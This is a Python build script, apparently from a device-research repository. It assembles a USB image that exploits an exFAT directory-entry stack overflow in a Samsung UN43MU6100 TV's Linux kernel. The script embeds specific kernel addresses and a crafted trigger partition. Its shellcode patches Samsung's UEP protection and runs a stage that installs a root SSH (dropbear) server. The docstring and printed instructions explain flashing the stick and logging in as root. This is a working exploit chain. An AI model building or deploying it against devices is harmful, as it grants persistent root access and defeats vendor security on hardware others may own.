#!/usr/bin/env python3
"""Build the one-plug dropbear USB image for the Kant UN43MU6100.

Target (hardware-verified):
    Samsung UN43MU6100, T-KTMUABC 1410.1, Linux 4.1.10 ARMv7
    (the Kant-M T-KTMDEUC 1410.1 kernel/exFAT modules are byte-identical)

The p1 exFAT volume carries the crafted ffsReadDir entry (SecondaryCount=58,
1710-byte name copy, 14 bytes under the exact 1724-byte stack headroom).  The
288-byte stage patches Samsung UEP at 0xc0211c70, then runs
`/bin/sh -c "sh</opt/media/USBDriveA2/s"`; stage1 detaches p1, copies the
dropbear + keys to /opt, and starts a key-only root dropbear on :22.

The p2 is FAT16 (type 0x0e) and is mounted noexec, so the dropbear is data
until stage1 copies it into /opt (vdfs4 rw).  Host keys are generated per build
with the shipped dropbearkey under qemu-arm; the operator key is supplied with
--authorized-keys and is never stored in this repository.

Usage:
    python3 kant/build_stick.py \
        --authorized-keys ~/.ssh/id_ed25519.pub \
        --out out/kant-usb-dropbear.img --force

Requires: python3, arm-none-eabi-as/objcopy, qemu-arm, dosfstools, mtools,
and payload/dropbearmulti (the static ARM EABI5 musl build from this repo).
"""
import argparse
import hashlib
import os
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
KANT = ROOT
P1_START = 2048          # 1 MiB
BLOCK = 512


def run(cmd, **kw):
    print("  $", " ".join(str(c) for c in cmd))
    return subprocess.run([str(c) for c in cmd], check=True, **kw).returncode


def sha(path):
    return hashlib.sha256(Path(path).read_bytes()).hexdigest()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--authorized-keys", default=os.path.expanduser("~/.ssh/id_ed25519.pub"))
    ap.add_argument("--out", default="out/kant-usb-dropbear.img")
    ap.add_argument("--dropbear", default=str(ROOT / "payload" / "dropbearmulti"))
    ap.add_argument("--p2-mb", type=int, default=16)
    ap.add_argument("--trigger-mb", type=int, default=8)
    ap.add_argument("--force", action="store_true")
    a = ap.parse_args()

    for tool in ("arm-none-eabi-as", "arm-none-eabi-objcopy", "qemu-arm", "mcopy"):
        if not shutil.which(tool):
            sys.exit(f"missing tool: {tool}")
    mkfs = shutil.which("mkfs.vfat") or "/usr/sbin/mkfs.vfat"
    if not os.path.exists(mkfs):
        sys.exit("missing mkfs.vfat (dosfstools)")
    if not Path(a.dropbear).is_file():
        sys.exit(f"dropbearmulti not found: {a.dropbear}")
    if not Path(a.authorized_keys).is_file():
        sys.exit(f"authorized keys not found: {a.authorized_keys}")
    if not (ROOT / "tools" / "mk_trigger.py").is_file():
        sys.exit("tools/mk_trigger.py missing")

    out = Path(a.out)
    if out.exists() and not a.force:
        sys.exit(f"{out} exists (use --force)")

    work = Path(tempfile.mkdtemp(prefix="kant-usb-"))
    try:
        # 1. compact 288-byte stage (UEP patch + p2 stage1 command)
        run([sys.executable, str(KANT / "build_compact.py")])
        blob = KANT / "compact_blob.bin"

        # 2. p1: crafted exFAT, num_ext=58, blob at 1420
        p1 = work / "p1.img"
        run([sys.executable, str(ROOT / "tools" / "mk_trigger.py"), str(p1),
             "--size-mb", str(a.trigger_mb), "--num-ext", "58",
             "--put", "528:c00083dc", "--put", "548:c0008424",
             "--put", "552:c0008e00", "--put", "556:c051ad5c",
             "--inject-allow-zero", f"1420:{blob}"])

        # 3. p2: dropbear + per-stick host keys + operator key + stage1
        p2 = work / "p2.img"
        with open(p2, "wb") as f:
            f.truncate(a.p2_mb * 2 ** 20)
        run([mkfs, "-F16", "-nSMTPAY", str(p2)])
        keys = work / "keys"
        keys.mkdir()
        run(["qemu-arm", a.dropbear, "dropbearkey", "-t", "ed25519",
             "-f", str(keys / "dropbear_host_ed25519")])
        run(["qemu-arm", a.dropbear, "dropbearkey", "-t", "rsa", "-s", "3072",
             "-f", str(keys / "dropbear_host_rsa")])
        ak = work / "authorized_keys"
        ak.write_bytes(Path(a.authorized_keys).read_bytes())
        shutil.copy(KANT / "stage1.sh", work / "s")
        for src, dst in (
            (a.dropbear, "dropbearmulti"),
            (keys / "dropbear_host_ed25519", "dropbear_host_ed25519"),
            (keys / "dropbear_host_rsa", "dropbear_host_rsa"),
            (ak, "authorized_keys"),
            (work / "s", "s"),
        ):
            run(["mcopy", "-i", str(p2), "-n", str(src), f"::{dst}"])

        # 4. MBR image: p1 @2048, p2 immediately after p1
        p1b = p1.read_bytes()
        p2b = p2.read_bytes()
        p2_start = P1_START + len(p1b) // BLOCK
        img = bytearray(p2_start * BLOCK + len(p2b))
        img[P1_START * BLOCK:P1_START * BLOCK + len(p1b)] = p1b
        img[p2_start * BLOCK:p2_start * BLOCK + len(p2b)] = p2b

        def part(i, off, size, typ):
            e = bytearray(16)
            e[0] = 0x80 if i == 0 else 0
            e[1:4] = b"\xfe\xff\xff"
            e[4] = typ
            e[5:8] = b"\xfe\xff\xff"
            struct.pack_into("<I", e, 8, off // BLOCK)
            struct.pack_into("<I", e, 12, size // BLOCK)
            img[446 + 16 * i:446 + 16 * (i + 1)] = e

        part(0, P1_START * BLOCK, len(p1b), 0x07)
        part(1, p2_start * BLOCK, len(p2b), 0x0e)
        img[510:512] = b"\x55\xaa"

        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(img)
        p1_sha = sha(p1)
        p2_sha = sha(p2)
    finally:
        shutil.rmtree(work)

    print(f"[+] wrote {out} ({len(img) // 2**20} MiB)")
    print(f"    image {sha(out)}")
    print(f"    p1    {p1_sha}")
    print(f"    p2    {p2_sha}")
    print(f"    flash: sudo dd if={out} of=/dev/sdX bs=4M conv=fsync status=progress")
    print("    then power-cycle the TV, insert the stick, and:")
    print(f"    ssh -i {Path(a.authorized_keys).with_suffix('')} root@<TV_IP>")


if __name__ == "__main__":
    main()
